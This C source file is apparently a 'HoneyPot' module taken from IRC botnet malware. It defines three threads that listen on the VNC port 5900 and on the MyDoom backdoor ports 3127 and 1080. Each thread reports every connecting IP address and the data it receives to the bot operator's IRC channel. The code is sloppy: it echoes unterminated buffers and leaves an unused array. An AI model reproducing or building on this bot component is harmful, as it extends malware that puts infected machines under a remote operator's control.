#include "includes.h"
#include "extern.h"
char tstr[256];
ds dl;
DWORD WINAPI VNCHONEYPOT(LPVOID param)
{
	char user[12], buffer[BUFSIZ];
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)5900);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					sprintf(tstr, "-HoneyPot.cpp- HoneyPot:: Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
					if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
						recv(csock,buffer,sizeof(buffer),0);
						sprintf(tstr, "-HoneyPot.cpp- [%s].", buffer);
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(tstr, "-HoneyPot.cpp- HoneyPot:: Error: server failed, returned: <%d>.", WSAGetLastError());
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}


DWORD WINAPI MYDOOM(LPVOID param)
{
	char user[12], buffer[BUFSIZ];
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)3127);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(tstr, "-HoneyPot.cpp- HoneyPot:: (MyDoom port 3127) Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
					if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
						recv(csock,buffer,sizeof(buffer),0);
						sprintf(tstr, "-HoneyPot.cpp- [%s].", buffer);
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(tstr, "-HoneyPot.cpp- HoneyPot:: Error: server failed, returned: <%d>.", WSAGetLastError());
		
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}

DWORD WINAPI MYDOOM2(LPVOID param)
{
	char user[12], buffer[BUFSIZ];
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)1080);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(tstr, "-HoneyPot.cpp- HoneyPot:: (MyDoom port 1080) Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
					if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
					
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
								recv(csock,buffer,sizeof(buffer),0);
						sprintf(tstr, "-HoneyPot.cpp- [%s].", buffer);
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);   
						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(tstr, "-HoneyPot.cpp- HoneyPot:: Error: server failed, returned: <%d>.", WSAGetLastError());
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE); 
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}